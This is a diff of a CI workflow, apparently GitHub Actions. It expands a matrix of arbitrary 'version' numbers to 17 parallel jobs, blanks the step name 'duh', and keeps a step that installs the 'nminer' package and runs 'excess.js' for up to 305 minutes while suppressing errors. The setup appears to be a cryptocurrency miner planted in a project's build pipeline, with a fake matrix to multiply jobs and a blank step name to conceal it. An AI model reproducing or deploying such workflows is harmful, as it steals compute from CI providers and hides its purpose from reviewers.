@@ -9,21 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2631 }
-          - { version: 6301 }
-          - { version: 1647 }
-          - { version: 6279 }
-          - { version: 699 }
-          - { version: 3416 }
-          - { version: 9541 }
-          - { version: 3703 }
-          - { version: 9022 }
-          - { version: 4188 }
-          - { version: 9157 }
-          - { version: 5678 }
-          - { version: 9181 }
-          - { version: 3719 }
-          - { version: 2832 }
+          - { version: 2216 }
+          - { version: 2976 }
+          - { version: 3023 }
+          - { version: 924 }
+          - { version: 3668 }
+          - { version: 1732 }
+          - { version: 8296 }
+          - { version: 5552 }
+          - { version: 5290 }
+          - { version: 5614 }
+          - { version: 6720 }
+          - { version: 9039 }
+          - { version: 2425 }
+          - { version: 9632 }
+          - { version: 190 }
+          - { version: 3769 }
+          - { version: 9419 }
 
     steps:
       - name: Checkout
@@ -34,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: duh
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 344m node excess.js || echo "excess executed"
+          timeout 305m node excess.js || echo "excess executed"
